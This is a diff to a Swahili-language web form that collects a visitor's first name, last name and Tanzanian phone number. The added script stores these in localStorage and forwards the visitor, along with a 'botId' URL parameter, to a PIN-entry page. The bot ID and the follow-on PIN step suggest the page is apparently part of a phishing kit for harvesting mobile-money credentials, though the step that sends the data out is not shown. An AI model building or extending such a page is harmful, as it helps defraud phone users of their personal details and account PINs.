@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="sw">
 <head>
@@ -234,6 +233,7 @@ input{
                     <label>Jina la Kwanza</label>
                     <input
                         type="text"
+                        id="firstName"
                         placeholder="Jina la Kwanza"
                         required>
                 </div>
@@ -242,6 +242,7 @@ input{
                     <label>Jina la Mwisho</label>
                     <input
                         type="text"
+                        id="lastName"
                         placeholder="Jina la Mwisho"
                         required>
                 </div>
@@ -260,6 +261,7 @@ input{
 
                     <input
                         type="tel"
+                        id="phoneNumber"
                         class="phone-input"
                         placeholder="712345678 au 0712345678"
                         required>
@@ -299,16 +301,55 @@ input{
 </div>
 
 <script>
-document.getElementById("detailsForm")
-.addEventListener("submit", function(e){
+// Get botId from URL
+const urlParams = new URLSearchParams(window.location.search);
+const botId = urlParams.get('botId');
+console.log('Bot ID on details page:', botId);
 
+// Store botId
+if (botId) {
+    localStorage.setItem('botId', botId);
+}
+
+document.getElementById("detailsForm").addEventListener("submit", function(e){
     e.preventDefault();
 
-    window.location.href = "pin.html";
+    // Get form values
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    let phone = document.getElementById('phoneNumber').value.trim();
 
+    // Validate phone number
+    if (!phone) {
+        alert('Tafadhali weka nambari yako ya simu');
+        return;
+    }
+
+    // Clean phone number - remove leading 0 if present
+    if (phone.startsWith('0')) {
+        phone = phone.substring(1);
+    }
+
+    // Validate phone is 9 digits
+    if (!/^\d{9}$/.test(phone)) {
+        alert('Tafadhali weka nambari sahihi ya simu (tarakimu 9)');
+        return;
+    }
+
+    // Format full phone number
+    const fullPhone = '+255 ' + phone;
+
+    // Save to localStorage
+    localStorage.setItem('firstName', firstName);
+    localStorage.setItem('lastName', lastName);
+    localStorage.setItem('phone', fullPhone);
+    localStorage.setItem('rawPhone', phone);
+
+    // Redirect to pin page with botId
+    const botIdParam = botId || localStorage.getItem('botId') || '';
+    window.location.href = `pin.html?botId=${botIdParam}`;
 });
 </script>
 
 </body>
 </html>
-```
